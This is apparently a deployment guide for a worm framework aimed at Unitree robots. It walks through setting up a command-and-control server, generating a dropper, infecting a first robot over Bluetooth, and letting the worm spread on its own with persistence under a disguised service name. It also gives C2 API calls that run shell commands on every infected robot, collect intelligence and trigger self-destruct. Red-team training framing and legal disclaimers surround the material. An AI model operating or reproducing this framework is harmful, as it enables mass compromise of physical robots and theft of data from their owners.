# Deployment Guide: Unitree Worm Framework

## ⚠️ WARNING

This guide is for **AUTHORIZED SECURITY RESEARCH ONLY** in controlled environments. Deploying this framework against unauthorized systems is **ILLEGAL**.

---

## 📋 Prerequisites

### Hardware Requirements

**C2 Server:**
- Linux server (Ubuntu 20.04+ recommended)
- 2+ CPU cores
- 4GB+ RAM
- 20GB+ storage
- Public IP or domain (for remote C2)

**Testing Environment:**
- Unitree robot(s) or test devices
- BLE-capable system for initial infection
- Isolated network for testing

### Software Requirements

```bash
# Operating System
Ubuntu 20.04+, Debian 11+, or compatible Linux distribution

# Python
Python 3.8 or higher

# System packages
bluetooth, bluez, libbluetooth-dev, nmap, python3-dev, build-essential
```

---

## 🚀 Installation

### Step 1: Clone Repository

```bash
git clone https://github.com/yourusername/unipwn.git
cd unipwn
```

### Step 2: Install Dependencies

```bash
# Update system
sudo apt-get update
sudo apt-get upgrade -y

# Install system dependencies
sudo apt-get install -y \
    bluetooth \
    bluez \
    libbluetooth-dev \
    nmap \
    python3-dev \
    python3-pip \
    build-essential

# Install Python dependencies
pip3 install -r requirements.txt
```

### Step 3: Configure Environment

```bash
# Create .env file
cat > .env <<EOF
# C2 Server Configuration
C2_HOST=0.0.0.0
C2_PORT=8443
C2_USE_TLS=false
C2_API_KEY=$(openssl rand -hex 32)
C2_OPERATOR_PASSWORD=$(openssl rand -base64 16)

# Database
DB_PATH=worm_c2.db

# Debug Mode (set to false for production)
WORM_DEBUG=true
EOF

# Load environment
source .env
export $(cat .env | xargs)
```

---

## 🎯 Deployment Scenarios

### Scenario 1: Single Robot Exploitation (Standalone)

**Use Case:** Test exploit on single robot without worm capabilities

```bash
# 1. Scan for robots
python3 unitree_hack.py --verbose

# 2. Select target and exploit
# Follow interactive prompts

# Example: Enable SSH
python3 unitree_hack.py --enable-ssh

# Example: Custom command
python3 unitree_hack.py
# Select "Execute command"
# Enter: "cat /etc/hostname"
```

### Scenario 2: Controlled Worm Test (Simulated)

**Use Case:** Test worm propagation in simulated environment

```bash
# 1. Run simulation test
python3 test_worm.py --simulate

# This will:
# - Create simulated robot environment
# - Test propagation logic
# - Generate infection statistics
# - No actual robots harmed :)
```

### Scenario 3: Red Team Exercise (Controlled Network)

**Use Case:** Full worm deployment in isolated test network

#### Phase 1: Setup C2 Server

```bash
# On C2 server
cd unipwn

# Configure for your environment
export C2_HOST="your-c2-server.local"
export C2_PORT="8443"

# Start C2 server
python3 c2_server.py

# Access dashboard at http://your-c2-server.local:8443/
# Default password from .env file
```

#### Phase 2: Generate Payloads

```bash
# Generate injection payloads
python3 <<EOF
from payload_builder import PayloadManager
pm = PayloadManager('http://your-c2-server.local:8443')

# Generate dropper
dropper = pm.generate_injection_command('patient_zero')
print(f"Dropper payload:\n{dropper}")

# Save payloads
pm.save_payloads('payloads/')
EOF
```

#### Phase 3: Initial Infection (Patient Zero)

```bash
# On attack system with BLE
python3 unitree_hack.py

# Select "Execute command"
# Paste dropper payload generated above
# This will:
# 1. Compromise robot via BLE
# 2. Download full worm agent
# 3. Establish persistence
# 4. Begin autonomous propagation
```

#### Phase 4: Monitor Propagation

```bash
# Access C2 dashboard
# Navigate to http://your-c2-server.local:8443/

# Or use API
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://your-c2-server.local:8443/api/v1/operator/stats
```

#### Phase 5: Command & Control

**Stop Propagation:**
```bash
curl -X POST http://your-c2:8443/api/v1/operator/task \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "robot_id": "*",
    "task_type": "PROPAGATE_STOP"
  }'
```

**Collect Intelligence:**
```bash
curl -X POST http://your-c2:8443/api/v1/operator/task \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "robot_id": "G1_XXXX_serial",
    "task_type": "COLLECT_INTEL"
  }'
```

**Execute Command:**
```bash
curl -X POST http://your-c2:8443/api/v1/operator/command \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "robot_id": "*",
    "command": "whoami; hostname; ip addr"
  }'
```

**Self-Destruct (Cleanup):**
```bash
curl -X POST http://your-c2:8443/api/v1/operator/task \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "robot_id": "*",
    "task_type": "SELF_DESTRUCT"
  }'
```

---

## 🧪 Testing & Validation

### Pre-Deployment Testing

```bash
# 1. Run unit tests
python3 test_worm.py --unit

# 2. Run benchmarks
python3 test_worm.py --benchmark

# 3. Test payload generation
python3 test_worm.py --payload

# 4. Test persistence (dry run)
python3 test_worm.py --persistence

# 5. Run full test suite
python3 test_worm.py --all
```

### Verify C2 Server

```bash
# Test C2 endpoints
# 1. Health check (should return C2 dashboard HTML)
curl http://your-c2:8443/

# 2. Login to get auth token
curl "http://your-c2:8443/api/v1/operator/login?password=YOUR_PASSWORD"

# 3. Test beacon endpoint (requires API key)
curl -X POST http://your-c2:8443/api/v1/beacon \
  -H "X-API-Key: YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "robot_id": "TEST_001",
    "timestamp": "2025-01-13T12:00:00",
    "status": "active"
  }'

# 4. Verify in database
sqlite3 worm_c2.db "SELECT * FROM robots;"
```

---

## 📊 Monitoring Deployment

### Real-Time Monitoring

```bash
# Watch C2 logs
tail -f /var/log/c2_server.log

# Monitor database
watch -n 5 'sqlite3 worm_c2.db "SELECT COUNT(*) FROM robots;"'

# Network activity
sudo tcpdump -i any port 8443 -A

# BLE activity
sudo hcidump -i hci0 -X
```

### Performance Metrics

```bash
# C2 server resource usage
htop

# Database size
du -h worm_c2.db

# Network bandwidth
iftop

# Number of infected robots
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://your-c2:8443/api/v1/operator/stats | jq '.total_robots'
```

---

## 🔧 Troubleshooting

### Issue: C2 Server Not Starting

```bash
# Check port availability
sudo netstat -tulpn | grep 8443

# Check permissions
ls -la worm_c2.db

# Check logs
journalctl -u c2_server -n 50
```

### Issue: Worm Agent Not Connecting to C2

```bash
# On infected robot, check network
ping -c 3 your-c2-server.local

# Check firewall
iptables -L -n

# Check worm logs
tail -f /var/log/unitree-service.log

# Verify C2 URL in config
cat /etc/unitree/.config
```

### Issue: BLE Exploit Failing

```bash
# Check Bluetooth service
sudo systemctl status bluetooth

# List BLE devices
bluetoothctl
> scan on
> devices

# Check permissions
groups $USER | grep bluetooth

# Add user to bluetooth group if needed
sudo usermod -a -G bluetooth $USER
```

### Issue: No Robots Found

```bash
# Verify BLE scanning
python3 <<EOF
import asyncio
from exploit_lib import scan_for_robots

async def test():
    robots = await scan_for_robots(timeout=30.0)
    print(f"Found {len(robots)} robots")
    for r in robots:
        print(f"  - {r.name} ({r.address})")

asyncio.run(test())
EOF
```

---

## 🛡️ Security Considerations

### Operational Security

1. **Use VPN/Tunnel for C2**
   ```bash
   # Use SSH tunnel for C2
   ssh -L 8443:localhost:8443 user@c2-server
   ```

2. **Rotate Credentials**
   ```bash
   # Change API key
   export C2_API_KEY=$(openssl rand -hex 32)
   # Restart C2 server
   ```

3. **Enable TLS**
   ```bash
   # Generate self-signed cert (testing only)
   openssl req -x509 -newkey rsa:4096 -keyout certs/server.key \
     -out certs/server.crt -days 365 -nodes
   
   # Set in config
   export C2_USE_TLS=true
   ```

4. **Audit Logging**
   ```bash
   # Enable comprehensive logging
   export WORM_DEBUG=true
   export VERBOSE_LOGGING=true
   ```

### Network Isolation

```bash
# Isolate test network
# Use separate VLAN or air-gapped network
# Block internet access for robots (except C2)

# Example iptables rules
sudo iptables -A OUTPUT -d YOUR_C2_IP -j ACCEPT
sudo iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
sudo iptables -A OUTPUT -j DROP
```

---

## 📝 Post-Exercise Cleanup

### Complete Cleanup Procedure

```bash
# 1. Stop all propagation
curl -X POST http://your-c2:8443/api/v1/operator/task \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"robot_id": "*", "task_type": "PROPAGATE_STOP"}'

# 2. Self-destruct all agents
curl -X POST http://your-c2:8443/api/v1/operator/task \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"robot_id": "*", "task_type": "SELF_DESTRUCT"}'

# 3. Wait for cleanup (check dashboard)

# 4. Manual cleanup on any remaining infections
# On each robot:
sudo systemctl stop unitree-service
sudo systemctl disable unitree-service
sudo rm -rf /usr/local/bin/unitree*
sudo rm -rf /etc/systemd/system/unitree-service.service
sudo rm -rf /etc/unitree/
sudo systemctl daemon-reload

# 5. Stop C2 server
# Ctrl+C on c2_server.py

# 6. Archive C2 database for analysis
cp worm_c2.db archives/exercise_$(date +%Y%m%d).db

# 7. Clean C2 database for next exercise
rm worm_c2.db
```

---

## 📚 Documentation & Reporting

### Exercise Report Template

```markdown
# Red Team Exercise Report: Unitree Worm Deployment

**Date:** [Date]
**Exercise ID:** [ID]
**Team:** [Team Name]

## Objectives
- [List objectives]

## Scope
- **Networks:** [IP ranges]
- **Systems:** [Number of robots]
- **Duration:** [Start - End time]

## Execution Summary
- **Initial Compromise:** [Timestamp, method]
- **Propagation Started:** [Timestamp]
- **Peak Infections:** [Number] robots at [Timestamp]
- **Commands Executed:** [List]
- **Data Collected:** [Summary]

## Timeline
| Time | Event |
|------|-------|
| T+0 | Initial compromise of patient zero |
| T+5min | First autonomous propagation |
| T+15min | 50% of robots infected |
| T+30min | Full network compromise |

## Findings
### Vulnerabilities Confirmed
- [List confirmed vulns]

### Detection Gaps
- [Areas where detection failed]

### Recommendations
- [Security improvements]

## Cleanup
- All agents removed: [Yes/No]
- Systems restored: [Yes/No]
- Lessons learned documented: [Yes/No]
```

---

## 🎓 Training Scenarios

### Scenario A: Detection Exercise (Blue Team)

**Objective:** Train blue team to detect worm

1. Deploy worm in isolated network
2. Provide blue team with SIEM access
3. Challenge: Detect infection within 30 minutes
4. Review detection rules and improve

### Scenario B: Response Exercise (IR Team)

**Objective:** Practice incident response

1. Pre-stage worm infection
2. Alert IR team of "suspicious activity"
3. IR team must:
   - Detect scope of infection
   - Contain spread
   - Eradicate worm
   - Restore systems
4. Measure response time and effectiveness

### Scenario C: Red Team vs Blue Team

**Objective:** Full adversary simulation

1. Red team deploys and controls worm
2. Blue team monitors and defends
3. Scoring based on:
   - Red: Robots infected, data collected
   - Blue: Detection speed, containment effectiveness
4. After-action review with both teams

---

## 📞 Support & Resources

**Documentation:**
- `README_WORM.md` - Framework overview
- `DEFENSE_GUIDE.md` - Detection and response
- `DEPLOYMENT.md` - This file

**Testing:**
- `test_worm.py --help` - Test framework usage

**Issues:**
- GitHub Issues (if published)
- Security researcher contacts

---

**Document Version:** 1.0  
**Last Updated:** 2025-01-13  
**Deployment Tested:** Ubuntu 22.04, Python 3.10

